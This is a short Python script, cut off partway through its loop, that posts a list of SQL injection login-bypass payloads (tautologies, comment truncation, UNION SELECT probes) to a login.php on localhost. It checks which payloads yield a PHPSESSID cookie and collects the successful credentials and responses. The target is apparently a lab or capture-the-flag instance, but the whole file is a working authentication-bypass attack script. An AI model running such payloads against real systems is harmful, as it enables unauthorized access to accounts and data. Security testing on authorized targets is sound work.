import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = "http://127.0.0.1:33167/login.php"
session = requests.Session()

# Payloads to test
payloads = [
    ("admin", "admin", "baseline"),
    ("admin' OR '1'='1'--", "", "SQLi_1"),
    ("admin'--", "", "SQLi_2"),
    ("admin'#", "", "SQLi_3"),
    ("' OR 1=1--", "", "SQLi_4"),
    ("' OR '1'='1", "", "SQLi_5"),
    ("admin' AND '1'='1'--", "", "SQLi_6"),
    ("admin' UNION SELECT null,null--", "", "SQLi_7"),
    ("admin' UNION SELECT 1,2--", "", "SQLi_8"),
    ("", "", "empty_creds"),
    ("admin", " ", "whitespace"),
    ("ADMIN", "ADMIN", "uppercase")
]

print("Test | Payload        | Status | Cookie | Length")
print("-" * 55)

successful_logins = []

for i, (username, password, name) in enumerate(payloads, 1):
    try:
        # Clear session cookies between tests to avoid carryover
        session.cookies.clear()
        
        response = session.post(
            target_url,
            data={"username": username, "password": password},
            timeout=15,
            allow_redirects=False
        )
        
        has_cookie = 'PHPSESSID' in response.cookies
        length = len(response.text)
        
        print(f"{i:2d}   | {name:<14} | {response.status_code:>3d}    | {str(has_cookie):<6} | {length:>6}")
        
        if has_cookie:
            successful_logins.append({
                'test_num': i,
                'username': username,
                'password': password,
                'name': name,
                'status': response.status_code,
                'cookies': dict(response.cookies),
                'response_preview': response.text[:200] if len(response.text) > 200 else response.text
            })
            
    except Exception as e:
